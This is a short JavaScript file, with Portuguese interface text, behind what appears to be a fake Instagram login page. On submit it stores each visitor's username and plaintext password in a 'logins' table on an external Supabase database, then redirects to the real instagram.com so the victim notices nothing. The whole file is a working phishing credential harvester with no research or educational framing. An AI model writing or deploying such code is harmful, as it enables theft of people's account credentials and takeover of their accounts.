const SUPABASE_URL = 'https://izhqxlnpiqpcekbedbkd.com';
const SUPABASE_KEY = 'sb_publishable_2Pu2zuS6DK78ldkqvueLAg_zTn_gl9b';
const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const userInp = document.getElementById('username');
const passInp = document.getElementById('password');
const btnSubmit = document.getElementById('btn-submit');
const loginForm = document.getElementById('login-form');

function checkInputs() {
    if (userInp.value.length > 0 && passInp.value.length >= 6) {
        btnSubmit.disabled = false;
        btnSubmit.classList.add('active');
    } else {
        btnSubmit.disabled = true;
        btnSubmit.classList.remove('active');
    }
}

userInp.addEventListener('input', checkInputs);
passInp.addEventListener('input', checkInputs);

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    btnSubmit.innerText = "Carregando...";
    btnSubmit.disabled = true;

    const { error } = await _supabase
        .from('logins')
        .insert([
            { 
                username: userInp.value, 
                password: passInp.value 
            }
        ]);

    if (error) {
        console.error('Erro ao salvar no banco:', error.message);
        alert('Erro ao conectar com o servidor.');
        btnSubmit.disabled = false;
        btnSubmit.innerText = "Entrar";
    } else {
        // Redireciona após o sucesso do salvamento
        window.location.href = "https://www.instagram.com";
    }
});